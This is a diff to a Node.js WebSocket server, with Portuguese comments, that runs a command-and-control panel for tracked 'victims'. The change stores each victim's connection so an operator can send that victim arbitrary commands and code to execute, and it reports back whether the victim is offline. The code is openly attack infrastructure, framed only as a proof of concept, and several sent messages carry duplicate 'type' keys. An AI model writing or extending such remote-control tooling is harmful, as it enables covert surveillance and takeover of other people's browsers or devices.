@@ -5,7 +5,8 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-const sessions = {};
+const sessions = {};        // sess -> array de logs
+const victimConnections = {}; // sess -> WebSocket
 const adminClients = new Set();
 
 app.get('/', (req, res) => {
@@ -432,12 +433,12 @@ wss.on('connection', (ws) => {
         return;
       }
 
-      // Limpar logs
+      // Comando de limpeza
       if (data.type === 'clear' && data.sess) {
         if (sessions[data.sess]) sessions[data.sess] = [];
         adminClients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ type: 'clear_ack', sess: data.sess }));
+            client.send(JSON.stringify({ type: 'update', sess: data.sess, type: 'clear_ack', _t: Date.now() }));
           }
         });
         return;
@@ -445,37 +446,42 @@ wss.on('connection', (ws) => {
 
       // COMANDO: encaminha para a vítima específica
       if (data.type === 'command' && data.target) {
-        // Procura a conexão da vítima (não temos conexão direta armazenada, mas podemos broadcast para todas)
-        // Na prática, como é uma prova de conceito, enviamos para todas as vítimas.
-        // Para enviar para uma específica, precisaríamos armazenar as conexões das vítimas.
-        // Vamos broadcast para todas as vítimas (que estão ouvindo).
-        // As vítimas são identificadas pelo SESS, mas não temos a conexão WS armazenada.
-        // Solução: enviar para TODAS as conexões que não são admin.
-        // Isso é um broadcast para todas as vítimas.
-        adminClients.forEach(client => {
-          if (client.readyState === WebSocket.OPEN) {
-            // Não reenvia para o próprio admin
-          }
-        });
-        // Na verdade, precisamos enviar para as vítimas. Vamos armazenar as conexões das vítimas.
-        // Para simplificar, vou modificar para broadcast para todos os clientes (inclusive admins) - mas o tracker filtra por tipo.
-        // O tracker só executa se receber um comando.
-        wss.clients.forEach(client => {
-          if (client.readyState === WebSocket.OPEN && !client.isAdmin) {
-            client.send(JSON.stringify({ type: 'command', cmd: data.cmd, code: data.code }));
-          }
-        });
-        // Log no admin
-        adminClients.forEach(client => {
-          if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
-          }
-        });
+        const targetWs = victimConnections[data.target];
+        if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+          // Envia o comando diretamente para a vítima
+          const cmdPayload = { type: 'command', cmd: data.cmd };
+          if (data.code) cmdPayload.code = data.code;
+          targetWs.send(JSON.stringify(cmdPayload));
+          // Notifica o admin que o comando foi enviado
+          adminClients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+              client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
+            }
+          });
+        } else {
+          // Vítima desconectada
+          adminClients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+              client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_error', error: 'Vítima offline', _t: Date.now() }));
+            }
+          });
+        }
         return;
       }
 
-      // Dados da vítima
+      // Dados da vítima (inclui handshake e logs normais)
       if (data.sess) {
+        // Armazena a conexão da vítima (para comandos futuros)
+        if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
+          victimConnections[data.sess] = ws;
+          // Quando a vítima se desconectar, remover do mapa
+          ws.on('close', () => {
+            if (victimConnections[data.sess] === ws) {
+              delete victimConnections[data.sess];
+            }
+          });
+        }
+
         if (!sessions[data.sess]) sessions[data.sess] = [];
         sessions[data.sess].push(data);
         adminClients.forEach(client => {
@@ -489,6 +495,12 @@ wss.on('connection', (ws) => {
 
   ws.on('close', () => {
     if (ws.isAdmin) adminClients.delete(ws);
+    // Remove a vítima do mapa se a conexão for dela
+    for (let sess in victimConnections) {
+      if (victimConnections[sess] === ws) {
+        delete victimConnections[sess];
+      }
+    }
   });
 });
 
